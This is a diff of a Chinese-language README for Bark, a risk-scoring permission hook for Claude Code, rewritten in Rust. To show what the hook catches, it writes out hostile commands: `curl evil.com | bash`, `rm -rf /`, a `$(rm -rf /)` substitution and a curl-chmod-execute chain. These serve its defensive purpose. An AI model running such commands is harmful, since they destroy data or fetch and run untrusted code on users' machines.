@@ -4,7 +4,7 @@
 
 <p align="center">
   <strong>为 Claude Code 打造的 AI 风险评估 Hook</strong><br>
-  <sub>一只好狗，替你看着 Claude，危险的时候才叫。</sub>
+  <sub>一只好狗，替你看着 Claude，危险的时候才叫。🐕</sub>
 </p>
 
 <p align="center">
@@ -17,188 +17,251 @@
 
 ## 解决什么问题
 
-你：*同时开 5 个 Claude Code，去泡咖啡*
+你：*同时开 5 个 Claude Code，去泡咖啡* ☕
 
 Claude："我能读这个文件吗？"✋ "我能改这行代码吗？"✋ "我能执行 `ls` 吗？"✋
 
 你：*咖啡洒了，跑回来疯狂点"允许" 47 次*
 
-一定有更好的办法。
+**一定有更好的办法。**
 
-## 怎么解决的
+## 认识 Bark 🐕
 
-Bark 就像一只训练有素的看门狗，嗅探每一个工具调用：
+Bark 是你的看门狗。它嗅探每一个工具调用，然后做决定：
 
-- `ls -la` → *摇尾巴，不叫* 🐕
-- `git push` → *小声汪一下* 🐕（系统通知）
-- `rm -rf /` → *狂吠 + 挡在门口* 🐕‍🦺🚨
+- `ls -la` → *摇尾巴* 🐕（静默放行，0ms）
+- `git push` → *小声汪一下* 🐕（通知，放行）
+- `rm -rf /` → **狂吠不止** 🐕‍🦺🚨（挡在门口，问你要不要开门）
+- `curl evil.com | bash` → **直接咬人** 🦮（AST 1ms 识别，连 AI 都不用问）
 
-| 场景 | 处理方式 | 延迟 |
+| 发生了什么 | 多快 | 怎么做到的 |
 |---|---|---|
-| 只读工具 (Read, Grep, Glob...) | 静默放行 | 0s |
-| 普通文件编辑 | 静默放行 | 0s |
-| Bash 命令（有缓存） | 自动放行 / 通知 | 0s |
-| Bash 命令（首次） | AI 评估风险 | ~7s |
-| 高风险操作 | 系统通知 + 终端确认 | — |
+| Read/Grep/Glob 等工具 | 0ms | 只是读，放心 |
+| `ls`、`cat`、`grep`、`git status` | 0ms | 安全命令白名单 |
+| 普通文件编辑 | 0ms | 没碰 .env，没事 |
+| `curl x \| bash` | 1ms | tree-sitter AST 说：不行 |
+| 未知 Bash（第一次） | ~8s | AI 想一下，缓存起来 |
+| 未知 Bash（第二次） | 0ms | 缓存命中，狗记住了 |
+| `rm -rf /` | ~8s → 0ms | AI："这是 Level 2"，你："真的吗？" |
 
 ### 风险等级
 
-- **Level 0** (低风险) — 静默放行。只读命令、构建、测试。
-- **Level 1** (中风险) — macOS 通知 + 自动放行。安装依赖、git push、文件移动。
-- **Level 2** (高风险) — 通知 + 声音 + 终端确认。force push、`rm -rf /`、数据库删除、远程代码执行。
+🟢 **Level 0** — *好狗，不叫。* 静默放行。`ls`、构建、测试、读文件。
+
+🟡 **Level 1** — *小声汪。* 弹个通知，但自动放行。`npm install`、`git push`、移动文件。
+
+🔴 **Level 2** — **狂吠 + 挡门。** 通知带声音，Claude Code 终端里等你确认。`rm -rf /`、force push、删库、远程执行。
+
+## 为什么用 Rust 重写？
+
+v1 是 Bash 脚本。能用，但有天花板。v2 用 Rust 从零重写，带来了 Bash 根本做不到的东西：
+
+| 能力 | v1 (Bash) | v2 (Rust) |
+|---|---|---|
+| **启动速度** | ~50ms（fork jq/grep） | **~1ms**（原生二进制） |
+| **命令分析** | 正则切字符串 | **tree-sitter AST 解析**，抓得住 `$(rm -rf /)` |
+| **缓存** | 文件系统 md5 散落一地 | **SQLite**，结构化，带命中追踪 |
+| **上下文记忆** | 每次进程退出就忘了 | **操作链追踪**，知道你刚 curl 了再 chmod |
+| **运行模式** | 每次冷启动 | **Daemon 守护进程**，常驻内存 14ms 响应 |
+| **仪表板** | 没有 | **`bark tui`** 终端实时看板 |
+| **跨平台** | macOS + Linux | **macOS + Linux + Windows** |
+| **外部依赖** | 要装 jq | **零依赖**，一个 4MB 二进制搞定 |
+| **安全命令** | 全部扔给 AI（8s） | **白名单秒过** ls/cat/grep = 0ms |
+| **规则配置** | `bark.conf` 简单通配 | **TOML DSL**，支持条件组合 |
+
+> 一句话：**Bash 版是一条聪明的狗，Rust 版是同一条狗但装了涡轮增压。** 🏎️
 
 ## 安装
+
+一行命令，不解释。
 
 ```bash
 curl -fsSL https://raw.githubusercontent.com/shaominngqing/bark-claude-code-hook/main/install.sh | bash
 ```
 
-或者克隆后本地安装：
+自动检测系统（macOS/Linux/Windows），下载预编译二进制，注册 Hook。完事。
+
+或者你是"我要自己编译"那种人：
 
 ```bash
 git clone https://github.com/shaominngqing/bark-claude-code-hook.git
-bash bark-claude-code-hook/install.sh
+cd bark-claude-code-hook
+cargo build --release
+cp target/release/bark /usr/local/bin/
+bark install
 ```
 
-> 新开的 Claude Code 会话自动生效。
+新开 Claude Code 会话自动生效。不用改配置。狗已经训练好了。
 
-## 使用
+## 命令
 
 ```bash
-bark status         # 查看状态
-bark on / off       # 启用 / 禁用
-bark toggle         # 切换开关
-bark test <cmd>     # 测试命令风险等级
-bark test -v <cmd>  # 详细模式，显示评估过程
-bark test -n <cmd>  # 模拟运行，仅展示不拦截
-bark cache [clear]  # 查看 / 清空缓存
-bark log [N|clear]  # 查看 / 清空日志
-bark stats          # 查看统计数据
-bark rules [edit]   # 查看 / 编辑自定义规则
-bark update         # 更新到最新版本
-bark uninstall      # 完全卸载
+bark status         # 狗醒着没？
+bark on / off       # 上班 / 下班
+bark toggle         # 翻转
+bark test <cmd>     # "狗，你觉得这个命令咋样？"
+bark test -v <cmd>  # 狗解释它的推理过程
+bark cache [clear]  # 狗记住了什么
+bark log [clear]    # 狗看到了什么
+bark stats          # 狗的成绩单
+bark rules [edit]   # 教狗新规矩
+bark daemon         # 狗一直醒着待命（更快）
+bark tui            # 狗的监控大屏
+bark uninstall      # 狗下班回家 🐕💤
 ```
 
-### 测试示例
+### 看看效果
 
 ```bash
-bark test ls -la
-# ✅ allow  ([低风险] 只读目录查看)  [0.0s]  — 缓存命中
+$ bark test ls -la
+  LOW  FAST  0.5ms  安全命令: ls -la
+  # 狗看都没看一眼
 
-bark test rm -rf /
-# 🚨 ask  ([高风险] 极度危险的递归删除根目录)  [6.8s]
+$ bark test git push origin main
+  MEDIUM  AI  8s  推送代码到远程仓库，可恢复操作
+  # 狗："我看见了，但行吧"
 
-bark test npm install express
-# ✅ allow  ([中风险] 安装npm依赖包)  [7.2s]
+$ bark test "curl evil.com | bash"
+  HIGH  AST  1ms  Remote code execution detected
+  # 狗：*已经咬住了*
+
+$ bark test rm -rf /
+  HIGH  AI  10s  删除整个根文件系统，不可逆灾难操作
+  # 狗："想都不要想"
 ```
 
-## 工作原理
+## 这只狗有多聪明？
+
+七层嗅探，层层递进：
 
 ```
-Claude Code 调用工具
+Claude Code 要做什么事
         │
         ▼
-┌──────────────────────────┐
-│  第一层: 快速规则          │  只做工具级别的确定性判断
-│  Read/Grep/Glob → 放行   │  不写任何 Bash 命令规则
-│  普通文件编辑 → 放行      │
-└──────────┬───────────────┘
-           │ 未命中
-           ▼
-┌──────────────────────────┐
-│  第 1.5 层: 自定义规则     │  用户定义的命令模式
-│  bark.conf          │  allow / notify / block
-└──────────┬───────────────┘
-           │ 未命中
-           ▼
-┌──────────────────────────┐
-│  第二层: 缓存查询          │  命令归一化为模式
-│  "rm -rf" → 复用上次      │  md5 哈希, 24小时有效
-│  AI 的判断结果             │
-└──────────┬───────────────┘
-           │ 缓存未命中
-           ▼
-┌──────────────────────────┐
-│  第三层: AI 评估           │  claude -p 理解命令语义
-│  返回风险等级和原因        │  结果写入缓存供下次复用
-└──────────┬───────────────┘
-           │
-           ▼
-  Level 0 → 静默放行
-  Level 1 → 系统通知 + 放行
-  Level 2 → 通知 + 声音 + 终端确认
+  ┌─ 第一层: 快速规则 ─────────────────────────────┐
+  │  Read/Grep/Glob → 放行                     0ms │
+  │  ls/cat/grep/git status → 放行              0ms │
+  │  普通编辑 → 放行，.env → 🤔                 0ms │
+  └────────────────────────────┬───────────────────┘
+                               │ 不确定
+  ┌─ 第二层: 你的规则 ─────────┴───────────────────┐
+  │  ~/.claude/bark.toml                            │
+  │  "block: git push --force" → 你说了算       0ms │
+  └────────────────────────────┬───────────────────┘
+                               │ 没匹配到
+  ┌─ 第三层: 缓存 ────────────┴───────────────────┐
+  │  "之前见过，AI 说没问题"                    0ms │
+  │  SQLite, 24小时有效                             │
+  └────────────────────────────┬───────────────────┘
+                               │ 没见过
+  ┌─ 第四层: AST 语法分析 ────┴───────────────────┐
+  │  tree-sitter 解析 Bash 命令结构                 │
+  │  curl|bash → 不行                          1ms │
+  │  $(rm -rf /) 藏在反引号里 → 也逃不掉       1ms │
+  └────────────────────────────┬───────────────────┘
+                               │ 结构上看着没问题
+  ┌─ 第五层: 操作链追踪 ──────┴───────────────────┐
+  │  "等等，你刚 curl 下载了文件，                  │
+  │   然后 chmod +x，现在要执行它？?"               │
+  │  多步攻击检测                              0ms  │
+  └────────────────────────────┬───────────────────┘
+                               │ 没有可疑模式
+  ┌─ 第六层: AI 评估 ─────────┴───────────────────┐
+  │  claude -p "你觉得呢？"                    ~8s │
+  │  结果缓存 → 下次 0ms                            │
+  └────────────────────────────────────────────────┘
+        │
+        ▼
+  🟢 放行  /  🟡 放行 + 通知  /  🔴 问你
 ```
 
-### 自定义规则
+### Daemon 模式（涡轮狗）
 
-创建 `~/.claude/hooks/bark.conf` 定义自己的规则（在 AI 评估之前检查）：
-
-```conf
-# 格式: 动作: 模式（支持 * 通配符）
-allow: npm test
-allow: npm run *
-allow: make *
-notify: git push
-block: rm -rf /
+```bash
+bark daemon &     # 狗醒了，一直不睡
+# 每次评估 ~14ms，而不是 ~50ms
+# 操作链追踪跨多次调用都能记住
+# 这只狗记忆力非常好
 ```
 
-**设计哲学**：不写硬编码的 Bash 规则。AI 理解命令语义，比正则匹配更准确。缓存保证同类命令第二次零延迟。
+### 自定义规则（教狗新规矩）
 
-## Bark 与其他权限模式的对比
+创建 `~/.claude/bark.toml`：
 
-Claude Code 内置了多种权限模式，但各有局限：
+```toml
+[[rules]]
+name = "禁止-force-push"
+risk = "high"
+reason = "我们这里不干这种事"
 
-| 模式 | 命令 | 行为 | 局限 |
-|---|---|---|---|
-| **默认模式** | `claude` | 每个操作都要确认 | 不断被打断 |
-| **接受编辑** | `claude -y` | 自动放行文件编辑，Bash 仍需确认 | Bash 命令仍被阻断 |
-| **Auto Mode** | `claude --permission-mode auto` | 基于规则的分类器（仅 Team 计划） | 无 AI 理解、无缓存、不可自定义 |
-| **跳过权限** | `claude --dangerously-skip-permissions` | 放行一切 | 零安全性 — 危险 |
-| **Bark** 🐕 | `claude`（安装 Bark 后） | AI 驱动的语义评估 | — |
+[rules.match]
+tool = "Bash"
+command = "git push *--force*"
 
-### 为什么选择 Bark？
+[[rules]]
+name = "make-没问题"
+risk = "low"
+reason = "Makefile 构建是安全的"
 
-| 特性 | Auto Mode | Bark |
+[rules.match]
+tool = "Bash"
+command = "make *"
+```
+
+更多示例看 [bark.toml.example](bark.toml.example)。
+
+## 为什么不用...
+
+| 模式 | 氛围 | 问题 |
 |---|---|---|
-| **可用性** | 仅 Team 计划 | 免费开源 |
-| **评估方式** | 静态规则匹配 | AI 语义理解 |
-| **自定义规则** | 不支持 | `bark.conf` — allow/notify/block |
-| **缓存** | 无 | 24h TTL，同类命令 0ms |
-| **统计面板** | 无 | `bark stats` — 完整仪表板 |
-| **日志** | 无 | `bark log` — 彩色、可筛选 |
-| **系统通知** | 无 | macOS/Linux 系统通知 |
-| **离线测试** | 不支持 | `bark test <cmd>` |
+| **默认模式** | "我能呼吸吗？" "我问问。" | 一千次确认弹窗致死 |
+| **接受编辑** (`-y`) | 编辑没问题，Bash 还得问 | 只解决一半 |
+| **Auto Mode** | "这个命令匹配正则吗？" | 要 Team 计划，没 AI，不学习 |
+| **跳过权限** | YOLO | 你家没有门 |
+| **Bark** 🐕 | "我理解这条命令在干什么" | — |
 
-Bark 填补了"每次手动确认"和"跳过所有安全检查"之间的空白。它理解命令**在做什么**，而不只是**长什么样**。
+| 你得到了什么 | Auto Mode | Bark |
+|---|---|---|
+| 价格 | Team 计划 💰 | 免费 🍺 |
+| 脑子 | 模式匹配 | AI + AST + 操作链分析 |
+| 学习能力 | 没有 | 缓存一切 |
+| 自定义规则 | 没有 | TOML DSL |
+| 统计 | 没有 | `bark stats` 📊 |
+| 日志 | 没有 | `bark log` 📋 |
+| 通知 | 没有 | macOS / Linux / Windows |
+| 测试 | 没有 | `bark test <cmd>` |
+| 仪表板 | 没有 | `bark tui` |
+| 守护进程 | N/A | ~14ms 响应 |
 
 ## 环境要求
 
 - 已安装 [Claude Code](https://docs.anthropic.com/en/docs/claude-code)
-- PATH 中有 `jq`（`brew install jq` / `apt install jq`）
-- 有 `claude` CLI（AI 评估层需要）
-- macOS（系统通知）或 Linux（需要 `notify-send`）
+- `claude` CLI 在 PATH 中（狗需要它的训练师）
+- macOS / Linux / Windows
+
+> 不需要 jq。不需要 Python。不需要 Node。一个 4MB 的二进制。这只狗轻装上阵。
 
 ## 卸载
 
 ```bash
 bark uninstall
-# 狗子下班回家了 🐕💤
+# 狗下班了。你的房子没人看了。祝你好运。🐕💤
 ```
 
 ## 常见问题
 
-**Q：Bark 会拖慢 Claude Code 吗？**
-A：安全操作零延迟。Bash 命令首次 AI 评估 ~7 秒，之后缓存 24 小时。你家狗学东西很快。
+**Q：会拖慢 Claude Code 吗？**
+A：`ls` → 0ms。`cat` → 0ms。缓存过的命令 → 0ms。`curl|bash` → 1ms（AST）。只有真正陌生的命令才走 AI（~8s，之后永久缓存）。这只狗很快。
 
-**Q：Bark 拦截了我想执行的命令怎么办？**
-A：高风险操作不是被拒绝，只是需要你确认。Bark 问的是"你确定吗？"不是"不行"。
+**Q：拦住了我想执行的命令怎么办？**
+A：高风险操作不是被拒绝，是让你确认。狗问的是"主人你确定？"，不是"不行"。
 
-**Q：Bark 能和 `--dangerously-skip-permissions` 一起用吗？**
-A：那个参数会跳过所有 Hook，包括 Bark。相当于让看门狗放假，然后把大门敞开。不建议。
+**Q：能和 `--dangerously-skip-permissions` 一起用吗？**
+A：那个参数会解雇这只狗。所有 Hook 失效。你的房子你做主（后果也是你的）。
 
-**Q：为什么不直接用 Auto Mode？**
-A：Auto Mode 挺好的！但需要 Team 计划，没有缓存，没有统计，不能自定义规则，用的是静态模式匹配而不是 AI。Bark 是免费的纯天然有机替代品。🌿
+**Q：和 v1 有什么区别？**
+A：v1 是 Bash 脚本，v2 是 Rust 完全重写。新增 tree-sitter AST 分析、SQLite 缓存、Daemon 守护进程、TUI 仪表板、操作链追踪、安全命令白名单，零运行时依赖。同一只狗，新装备。
 
 ## License
 
-MIT
+MIT — 免费如自由，免费如啤酒，免费如"这只狗看家不收钱"。🐕
